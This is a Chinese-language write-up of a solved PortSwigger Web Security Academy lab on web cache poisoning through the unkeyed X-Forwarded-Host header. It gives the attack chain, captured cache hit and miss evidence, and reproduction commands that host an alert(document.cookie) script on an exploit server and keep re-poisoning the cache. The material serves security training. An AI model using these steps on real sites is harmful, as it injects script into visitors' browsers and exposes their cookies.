---
title: "lab-web-cache-poisoning-with-an-unkeyed-header"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-with-an-unkeyed-header

> evidences: [[cache-poisoning-family]]

- 题面:Web cache poisoning with an unkeyed header(/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)
- 实例:https://0a1400d904b476cc80ee7635000500de.web-security-academy.net
- 利用服务器:https://exploit-0a1a00c804d476f980f8752401230038.exploit-server.net
- 判定目标:投毒缓存,使访客浏览器执行 `alert(document.cookie)`
- 状态:**solved**(横幅 `Congratulations, you solved the lab!`)

## 链

1. 首页 body 直接输出 `<script src="//<host>/resources/js/tracking.js">`,其中 `<host>` 取自
   **`X-Forwarded-Host`**;`/` 响应 `Cache-Control: max-age=30`、**无 `Vary`**、无 `Set-Cookie`。
   → `X-Forwarded-Host` 未键控;`/` 可缓存。
2. 利用服务器 STORE `responseFile=/resources/js/tracking.js`,
   `responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript`,
   `responseBody=alert(document.cookie)`(实测 200/`application/javascript`,22 字节)。
3. 投毒:`GET /` 带 `X-Forwarded-Host: exploit-…`(cache miss → 写回)。
   复验裸 `GET /` → `X-Cache: hit`,body 11063→11065,src 指向利用服务器。
4. 访客访问 `/` → 浏览器加载 `//exploit-…/resources/js/tracking.js` → 弹 `alert(document.cookie)`。
   `poison_loop` 每 8s 续投保持 30s TTL;约 1 分钟内访客命中 → solved。

## 证据摘录

```
GET / (X-Forwarded-Host: exploit-…) -> 200, cache-control: max-age=30, x-cache: miss
  <script … src="//exploit-0a1a00c804d476f980f8752401230038.exploit-server.net/resources/js/tracking.js">
GET / (无头)                        -> x-cache: hit, age 5, 同一 src(投毒已共享)
solved_check <inst>                 -> solved: true
```

## 复现命令

```
lab_page "https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header" --out /tmp/b8-1.html
lab_launch launch 145BAF066FE7FE27BB26A1A295E6A58D17AC101777181CC01014C893FDDA06C6 --widget-source /web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header --jar /tmp/b8-jar1.json
lab_http post "https://exploit-<id>.exploit-server.net/" --form urlIsHttps=on --form responseFile=/resources/js/tracking.js --form 'responseHead=HTTP/1.1 200 OK\nContent-Type: application/javascript' --form 'responseBody=alert(document.cookie)' --form formAction=STORE
poison_loop "<inst>/" --header "X-Forwarded-Host: exploit-<id>.exploit-server.net" --interval-secs 8 --count 70 --jar /tmp/b8-jar1.json
solved_check "<inst>" --jar /tmp/b8-jar1.json
```
